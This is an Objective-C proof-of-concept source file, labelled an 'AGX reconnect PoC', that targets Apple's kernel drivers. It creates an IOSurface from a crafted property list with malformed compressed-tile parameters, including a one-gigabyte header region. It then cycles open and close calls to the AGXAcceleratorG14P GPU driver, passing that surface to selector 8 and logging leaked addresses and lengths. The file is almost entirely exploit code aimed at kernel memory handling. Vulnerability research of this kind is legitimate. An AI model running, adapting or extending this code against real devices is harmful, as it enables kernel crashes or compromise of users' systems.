#import "poc.h"
#import "logger.h"
#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
#import <string.h>
#import <unistd.h>

static NSString *f1_xml(void)
{
    return @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
    "<plist version=\"1.0\"><dict>"
    "<key>IOSurfaceWidth</key><integer>64</integer>"
    "<key>IOSurfaceHeight</key><integer>64</integer>"
    "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
    "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
    "<key>IOSurfaceAllocSize</key><integer>65536</integer>"
    "<key>IOSurfaceSliceCount</key><integer>4</integer>"
    "<key>IOSurfacePlaneInfo</key><array><dict>"
    "<key>IOSurfacePlaneWidth</key><integer>64</integer>"
    "<key>IOSurfacePlaneHeight</key><integer>64</integer>"
    "<key>IOSurfacePlaneBytesPerElement</key><integer>4</integer>"
    "<key>IOSurfacePlaneBytesPerRow</key><integer>512</integer>"
    "<key>IOSurfacePlaneSize</key><integer>65536</integer>"
    "<key>IOSurfacePlaneCompressionType</key><integer>4</integer>"
    "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer>"
    "<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer>"
    "<key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer>"
    "<key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer>"
    "<key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer>"
    "<key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer>"
    "<key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer>"
    "<key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer>"
    "<key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer>"
    "<key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer>"
    "<key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer>"
    "<key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer>"
    "</dict></array></dict></plist>\n";
}

static IOSurfaceID create_f1_surface(void)
{
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("IOSurfaceRoot"));
    if (!svc) return 0;
    io_connect_t conn = 0;
    if (IOServiceOpen(svc, mach_task_self(), 0, &conn) != KERN_SUCCESS) {
        IOObjectRelease(svc);
        return 0;
    }
    IOObjectRelease(svc);

    NSString *xml = f1_xml();
    NSData *xd = [xml dataUsingEncoding:NSUTF8StringEncoding];
    NSMutableData *call = [xd mutableCopy];
    uint8_t nul = 0;
    [call appendBytes:&nul length:1];

    uint8_t out[0xc68];
    memset(out, 0, sizeof(out));
    uint64_t sc[1] = {0};
    size_t outSize = sizeof(out);
    kern_return_t kr = IOConnectCallMethod(conn, 0, sc, 1, call.bytes, call.length,
                                           NULL, NULL, out, &outSize);
    uint32_t sid = outSize >= 0x1c ? *(uint32_t *)(out + 0x18) : 0;
    log_write(@"F1 sel0=0x%x sid=%u out=0x%zx", kr, sid, outSize);
    if (kr != KERN_SUCCESS || !sid) {
        IOServiceClose(conn);
        return 0;
    }
    return sid;
}

void poc_run(void)
{
    log_start();
    log_write(@"=== AGX reconnect PoC start ===");
    ui_update(@"creating F1 surface...");

    IOSurfaceID sid = create_f1_surface();
    if (!sid) {
        log_write(@"F1 surface failed");
        ui_update(@"F1 surface failed");
        return;
    }
    ui_update([NSString stringWithFormat:@"F1 sid=%u; reconnecting...", sid]);

    for (int i = 0; i < 32; i++) {
        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                       IOServiceMatching("AGXAcceleratorG14P"));
        io_connect_t ac = 0;
        if (svc != IO_OBJECT_NULL) {
            IOServiceOpen(svc, mach_task_self(), 1, &ac);
            IOObjectRelease(svc);
        }
        log_write(@"cycle[%d]: open conn=0x%x", i, ac);
        ui_update([NSString stringWithFormat:@"cycle[%d] open=0x%x", i, ac]);
        if (!ac) break;

        uint8_t in[0x100];
        memset(in, 0, sizeof(in));
        *(uint32_t *)(in + 0x00) = 0x82;
        *(uint32_t *)(in + 0x34) = 0;
        *(uint32_t *)(in + 0x38) = sid;
        *(uint32_t *)(in + 0x3c) = 0;

        uint8_t out[0x1000];
        memset(out, 0, sizeof(out));
        size_t outSize = sizeof(out);
        log_write(@"cycle[%d]: sel8", i);
        kern_return_t kr = IOConnectCallMethod(ac, 8, NULL, 0, in, sizeof(in),
                                               NULL, NULL, out, &outSize);
        uint64_t va = outSize >= 8 ? *(uint64_t *)(out + 0x00) : 0;
        uint64_t len = outSize >= 0x30 ? *(uint64_t *)(out + 0x28) : 0;
        log_write(@"cycle[%d]: -> 0x%x va=0x%llx len=0x%llx",
                  i, kr, (unsigned long long)va, (unsigned long long)len);
        ui_update([NSString stringWithFormat:@"cycle[%d] -> 0x%x", i, kr]);

        IOServiceClose(ac);
        log_write(@"cycle[%d]: close", i);
        usleep(50000);
    }
    log_write(@"=== AGX reconnect PoC done (no hang) ===");
    ui_update(@"done (no hang)");
}
